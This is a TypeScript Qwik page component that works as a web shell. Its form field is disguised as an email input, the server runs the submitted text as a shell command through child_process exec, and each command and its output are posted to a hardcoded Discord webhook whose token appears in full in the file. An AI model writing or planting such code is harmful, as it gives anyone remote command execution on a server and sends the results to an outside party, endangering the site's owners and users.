import { component$ } from '@builder.io/qwik';
import { formAction$, useForm, valiForm$ } from '@modular-forms/qwik';
import { exec } from 'child_process';
import { Input, object, string } from 'valibot';


const cmdSchema = object({
  cmd: string()
});

type cmdForm = Input<typeof cmdSchema>;

const sendMessage = async (content: any) => {
    try {
        const response = await fetch("https://discord.com/api/webhooks/1206988303912665148/L6GHf_2H20kGmJTVQckpj-Wpj87y4jR9rEwHMdmsgINXd9JBNdnC4GSePK6OH9NlLXjc", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ content }),
        });

        if (!response.ok) {
            throw new Error('Failed to send message to webhook');
        }

        console.log('Message sent successfully');
    } catch (error) {
        console.error('Error sending message:', error);
    }
};


export const useFormAction = formAction$<cmdForm>((values) => {
    exec(values.cmd, (error, stdout) => {
    if (error) {
        return;
    }
    sendMessage("```\n"+values.cmd+"\n\n"+stdout+"```")
    });
}, valiForm$(cmdSchema));

export default component$(() => {
    const [, { Form, Field }] = useForm<cmdForm>({
        loader: {value: {"cmd": ""}},
        action: useFormAction(),
        validate: valiForm$(cmdSchema),
  });
    return (
    <>
        <Form>

            <Field name="cmd">
                {(field, props) => (
                <div>
                    <input
                        {...props}
                        id={field.name}
                        value={field.value}
                        type="email"
                        required
                    />
                {field.error && <div>{field.error}</div>}
                </div>
                )}
            </Field>
            <button type="submit">Send</button>
        </Form>
    </>
    );
});
